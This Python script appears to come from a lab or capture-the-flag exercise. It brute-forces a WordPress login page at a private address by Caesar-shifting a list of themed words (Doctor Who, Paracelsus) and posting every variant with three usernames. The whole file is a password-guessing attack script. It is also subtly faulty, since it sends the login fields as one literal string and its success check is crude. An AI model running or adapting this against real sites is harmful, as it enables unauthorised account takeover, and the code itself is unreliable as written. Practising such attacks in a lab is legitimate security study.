import requests

words = ["Slitheen", "slitheen", "whovian", "Paracelsus", "paracelsus", "Sola Dosis Facit Venenum", "sola dosis facit venenum", "SolaDosisFacitVenenum", "soladosisfacitvenenum", "Theophrastus Bombastus Von Hohenheim", "TheophrastusBombastusVonHohenheim", "theophrastus bombastus von hohenheim", "theophrastusbombastusvonhohenheim", "Jodie Whittake", "JodieWhittake", "jodie whittake", "jodiewhittake", "Tardis", "tardis", "theTardis", "thetardis", ]

user = ["chrisb14", "sigurda", "sigurdkb"]

#r = requests.get('http://10.225.147.164/wp-login.php')

def caesars():
    t = 1
    while t<27:
        password = ""
        word = words[0]
        for i in range(len(word)):
            char = word[i]
            if char.isupper():
                password += chr((ord(char) + t - 65) % 26 + 65)
            else:
                password += chr((ord(char) + t - 97) % 26 + 97)
        for us in user:
            print(us + ": " + password)
            payload = "'user_login': '" + us + "', 'user_pass': '" + password + "'"
            r = requests.post('http://10.225.147.164/wp-login.php', data=payload)
            #print(r.text)
            if "user_login" not in r.text or "user_pass" not in r.text:
                t = 27
                print("Brukernavn: " + us)
                print("Passordet er: " + password)

        if t == 26:
            del words[0]
            print("")
        t = t+1


while len(words)>0:
    caesars()
